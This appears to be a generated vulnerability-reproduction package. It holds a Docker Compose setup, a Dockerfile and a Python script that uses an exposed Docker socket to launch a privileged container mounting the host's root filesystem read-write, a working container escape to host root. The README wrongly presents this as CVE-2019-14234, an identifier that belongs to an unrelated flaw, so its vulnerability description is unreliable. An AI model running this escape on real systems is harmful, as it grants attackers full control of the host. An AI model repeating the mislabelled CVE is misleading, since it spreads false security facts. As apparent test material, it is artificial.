{
    "files": [
        {
            "location": "docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  vulnerable_docker:\n    image: docker:20.10-dind\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n      - docker_data:/var/lib/docker\n    healthcheck:\n      test: [\"CMD\", \"docker\", \"info\"]\n      interval: 5s\n      timeout: 2s\n      retries: 5\n\n  attacker_client:\n    build: ./attacker_client\n    privileged: true\n    depends_on:\n      vulnerable_docker:\n        condition: service_healthy\n    environment:\n      - DOCKER_HOST=unix:///var/run/docker.sock\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n\nvolumes:\n  docker_data:"
        },
        {
            "location": "attacker_client/Dockerfile",
            "content": "FROM python:3.9-slim\nWORKDIR /app\nCOPY exploit.py .\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends build-essential && \\\n    pip install docker==4.4.4 && \\\n    apt-get purge -y --auto-remove build-essential && \\\n    rm -rf /var/lib/apt/lists/*\nCMD [\"python\", \"/app/exploit.py\"]"
        },
        {
            "location": "attacker_client/exploit.py",
            "content": "import docker\nimport time\n\n# Connect to the Docker daemon exposed via the shared Unix socket\nclient = docker.from_env()\n\n# Launch a privileged Alpine container that bind\u2011mounts the host root filesystem\ncontainer = client.containers.run(\n    \"alpine:3.11\",\n    command=\"sh\",\n    detach=True,\n    tty=True,\n    volumes={\"/\": {\"bind\": \"/host\", \"mode\": \"rw\"}},\n    name=\"cve_exploit\",\n    privileged=True\n)\n\nprint(\"Exploit container started with ID:\", container.id)\nprint(\"If the host is vulnerable, you now have a root shell inside the container.\")\n# Keep the script alive so the container stays running for manual inspection\nwhile True:\n    time.sleep(60)"
        },
        {
            "location": "README.md",
            "content": "# CVE\u20112019\u201114234 Demo Environment\n\nThis repository provides a minimal Docker\u2011Compose setup that reproduces the privilege\u2011escalation vulnerability identified as **CVE\u20112019\u201114234**.\n\n## Components\n\n- **vulnerable_docker** \u2013 A Docker\u2011in\u2011Docker (DinD) engine (Docker\u202f20.10) running in privileged mode with its own storage. It exposes its Unix socket via a bind\u2011mount so other services can talk to it.\n- **attacker_client** \u2013 A tiny Python client that connects to the DinD daemon through the shared socket and launches a container that mounts the host's root filesystem, demonstrating the exploitation path.\n\n## How to Run\n\n```bash\n# From the directory containing the docker\u2011compose.yml file:\n\ndocker compose up --build\n```\n\nThe `attacker_client` service will automatically start, connect to the Docker daemon, and launch the exploit container. If the host system is vulnerable, the exploit container will have access to the host's filesystem and provide a privileged shell.\n\n## Clean\u2011up\n\n```bash\ndocker compose down -v --rmi all\n```\n\n**Warning:** This setup is intentionally insecure and should only be used in an isolated, controlled environment for research and testing purposes."
        }
    ],
    "directory_tree": "CVE-2019-14234/custom_no_tool"
}